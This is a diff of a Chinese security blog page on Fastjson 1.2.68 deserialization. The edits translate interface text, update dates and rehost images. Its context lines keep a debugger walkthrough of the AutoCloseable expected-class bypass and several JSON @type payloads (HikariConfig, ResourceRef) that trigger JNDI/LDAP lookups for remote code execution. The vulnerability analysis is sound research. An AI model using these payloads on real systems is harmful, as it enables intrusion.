@@ -46,7 +46,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-08-07T13:37:25.000Z">
-<meta property="article:modified_time" content="2025-08-07T15:30:21.613Z">
+<meta property="article:modified_time" content="2026-04-22T15:36:03.711Z">
 <meta property="article:author" content="n1utra">
 <meta property="article:tag" content="JAVA安全">
 <meta property="article:tag" content="FastJson反序列化">
@@ -1701,9 +1701,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 		'}'+
 	'</style>'+
     '<div class="kill-ie">'+
-        `<span class="kill-t"><b>抱歉，您的浏览器无法访问本站</b></span><br/>`+
-        `<span class="kill-c">微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</span><br/>`+
-        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>了解详情 ></strong></a>`+
+        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
+        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
+        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
     '</div>');
 </script>
 
@@ -1731,9 +1731,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 		}
 	</style>
     <div class="kill-noscript">
-        <span class="kill-t"><b>抱歉，您的浏览器无法访问本站</b></span><br/>
-        <span class="kill-c">本页面需要浏览器支持（启用）JavaScript</span><br/>
-        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
+        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
     </div>
 </noscript>
 
@@ -2115,7 +2115,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: "env",
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1765818160203),
+    lastupdate: new Date(1776961364761),
     cdn: {
       izitoast_css: 'https://unpkg.com/izitoast@1.4.0/dist/css/iziToast.min.css',
       izitoast_js: 'https://unpkg.com/izitoast@1.4.0/dist/js/iziToast.min.js',
@@ -2153,8 +2153,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     languages: {
       
         search: {
-          hits_empty: "找不到您查询的内容：${query}",
-          hits_stats: "找到 ${hits} 条结果，用时 ${time} 毫秒",
+          hits_empty: "We didn't find any results for the search: ${query}.",
+          hits_stats: "${hits} results found in ${time} ms",
         }
       
     }
@@ -2576,9 +2576,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><code>TypeUtils</code>类</li>
 </ul>
 <h2 id="MiscCodec修复"><a href="#MiscCodec修复" class="headerlink" title="MiscCodec修复"></a>MiscCodec修复</h2><p>1.2.47及之前，在解析<code>java.lang.Class</code>类的时候默认<code>cache</code>为true，导致第二次反序列化时可以直接从缓存中获取。而1.2.48强制关闭，不再加入缓存。</p>
-<p><img src="/static/pic/image-20250807221028386.png" class="lazyload" data-srcset="/static/pic/image-20250807221028386.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807221028386"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/Hng3/20260422233305305.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/Hng3/20260422233305305.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807221028386"></p>
 <h2 id="TypeUtils修复"><a href="#TypeUtils修复" class="headerlink" title="TypeUtils修复"></a>TypeUtils修复</h2><p>1.2.47的无参&#x2F;单参<code>loadClass</code>默认<code>cache</code>为<code>true</code>，1.2.48全部改为<code>false</code></p>
-<p><img src="/static/pic/image-20250807230343536.png" class="lazyload" data-srcset="/static/pic/image-20250807230343536.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807230343536"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/nCc1/20260422233320094.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/nCc1/20260422233320094.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807230343536"></p>
 <h1 id="1-2-68及之前可利用链"><a href="#1-2-68及之前可利用链" class="headerlink" title="1.2.68及之前可利用链"></a>1.2.68及之前可利用链</h1><p>在1.2.68的期望类绕过之前的利用链，都需要开启<code>AutoType</code>，并且结合未拉黑的利用链，这里不再过多赘述。<code>payload</code>来自<code>safe6sec</code>师傅的：<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合</a>，利用时还需要满足依赖包版本</p>
 <h2 id="1-2-59版本"><a href="#1-2-59版本" class="headerlink" title="1.2.59版本"></a>1.2.59版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -2610,29 +2610,29 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>在<code>checkAutoType</code>处下断点，调试运行<code>payload</code></p>
 <p>停留在断点时的<code>typeName</code>为<code>java.lang.AutoCloseable</code></p>
-<p><img src="/static/pic/image-20250807232049991.png" class="lazyload" data-srcset="/static/pic/image-20250807232049991.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232049991"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/cFr3/20260422233347379.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/cFr3/20260422233347379.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232049991"></p>
 <p>进入方法看看是如何绕过的</p>
 <p>前面的判断基本不满足，一直运行到当运行到从缓存中读取类时，这里是能够获取到<code>AutoClaseable</code>的</p>
-<p><img src="/static/pic/image-20250807232103048.png" class="lazyload" data-srcset="/static/pic/image-20250807232103048.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232103048"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/v8vJ/20260422233404482.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/v8vJ/20260422233404482.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232103048"></p>
 <p>因为在<code>TypeUtils</code>初始化是就将<code>AutoCloseable</code>进行了加载</p>
-<p><img src="/static/pic/image-20250807232137883.png" class="lazyload" data-srcset="/static/pic/image-20250807232137883.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232137883"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/3gBn/20260422233420298.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/3gBn/20260422233420298.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232137883"></p>
 <p>那么此时clazz就有值了，继续往下执行，这里判断clazz是否为空，然后期望类是否不为空。然后对clazz进行了返回</p>
-<p><img src="/static/pic/image-20250807232209246.png" class="lazyload" data-srcset="/static/pic/image-20250807232209246.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232209246"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/lCo7/20260422233434971.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/lCo7/20260422233434971.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232209246"></p>
 <p>返回之后就跳出了<code>CheckAutoType</code>，那么再来看看我们构造的恶意类是在哪里加载执行的</p>
 <p>一直向下运行，进入<code> deserializer.deserialze()</code>这里</p>
 <p>运行到这里，通过<code>lexer</code>解析器获取了传入的恶意类名</p>
-<p><img src="/static/pic/image-20250807232221228.png" class="lazyload" data-srcset="/static/pic/image-20250807232221228.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232221228"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/Ok2t/20260422233453504.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/Ok2t/20260422233453504.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232221228"></p>
 <p>然后在下面这处位置获得了期望类</p>
-<p><img src="/static/pic/image-20250807232233542.png" class="lazyload" data-srcset="/static/pic/image-20250807232233542.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232233542"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/3Axp/20260422233507519.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/3Axp/20260422233507519.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232233542"></p>
 <p>接着又进入了<code>checkAutoType</code>，但是此时加载的类变成了<code>RCE</code>，并且存在了期望类</p>
 <p>然后一直执行，最后是在下面这段代码中获得了<code>RCE.class</code>文件的字节码</p>
 <p>这里是先获得字节码路径，如果默认类加载器，就用默认类读取资源，但是这里是null，那么就进入了else分支，通过当前类的类加载器去读取资源，然后获取到字节流</p>
 <p>此时有了字节流<code>is</code>，然后通过<code>ClassReader</code>解析字节流，然后通过<code>TypeCollector</code>收集类中的信息，这里是在收集<code>&lt;clinit&gt;</code>，表示类静态代码块<code>static&#123;&#125;</code>，<code>new Class[0]</code>表示0个参数，这里是为了检查静态代码块中是否存在安全问题、检查是否设计JSON相关的注解处理等</p>
-<p><img src="/static/pic/image-20250807232246564.png" class="lazyload" data-srcset="/static/pic/image-20250807232246564.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232246564"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/zM0v/20260422233526724.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/zM0v/20260422233526724.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232246564"></p>
 <p>然后继续执行，在下面这段代码中完成了类的加载</p>
-<p><img src="/static/pic/image-20250807232256557.png" class="lazyload" data-srcset="/static/pic/image-20250807232256557.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232256557"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/igM4/20260422233539123.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/igM4/20260422233539123.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232256557"></p>
 <p>然后在后面对类进行了返回</p>
-<p><img src="/static/pic/image-20250807232310290-1754580190944-1.png" class="lazyload" data-srcset="/static/pic/image-20250807232310290-1754580190944-1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232310290"></p>
+<p><img src="https://files.seeusercontent.com/2026/04/22/p8Lc/20260422233600492.png" class="lazyload" data-srcset="https://files.seeusercontent.com/2026/04/22/p8Lc/20260422233600492.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232310290"></p>
 <h3 id="利用payload"><a href="#利用payload" class="headerlink" title="利用payload"></a>利用payload</h3><p>在实际的应用中，并没有<code>RCE</code>这个类能够直接用，需要找到其他<code>AutoCloseable</code>的子类，比如读文件写文件等操作类都继承了这个类，所以这里常用的也是用来读写文件。</p>
 <p><strong>其他依赖实现RCE</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -2680,10 +2680,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-08-07T23:30:21+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2026-04-22T23:36:03+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Aug 7, 2025</p>
+    <p>更新于：Apr 22, 2026</p>
   </a>
 </div>
 
@@ -2711,10 +2711,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='next' href='/2025/08/04/FastJson-1-2-47%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/'>
           <p class='title'>浅述Fastjson(2)：FastJson 1.2.47及之前利用<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>Fastjson1.2.24利用点分析在前篇中讲述了fastjson的反序列化流程，能看出来与java原生反序列化的不同点
+          <p class='content'>FastJson-1-2-47及之前利用在前篇中讲述了fastjson的反序列化流程，能看出来与java原生反序列化的不同点
 
 fastjson反序列化的类不需要实现序列化接口
-原生反序列化时属性...</p>
+原生反序列化时属...</p>
         </a>
       
     </div>
@@ -3171,7 +3171,7 @@ fastjson反序列化的类不需要实现序列化接口
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/08/07/FastJson-1-2-68及之前利用/","name":"浅述Fastjson(3)：FastJson 1.2.68及之前利用"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"浅述Fastjson(3)：FastJson 1.2.68及之前利用","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/","wordCount":0,"datePublished":"2025-08-07T13:37:25.000Z","dateModified":"2025-08-07T15:30:21.613Z","keywords":"JAVA安全,FastJson反序列化","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/08/07/FastJson-1-2-68及之前利用/","name":"浅述Fastjson(3)：FastJson 1.2.68及之前利用"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"浅述Fastjson(3)：FastJson 1.2.68及之前利用","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/","wordCount":0,"datePublished":"2025-08-07T13:37:25.000Z","dateModified":"2026-04-22T15:36:03.711Z","keywords":"JAVA安全,FastJson反序列化","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
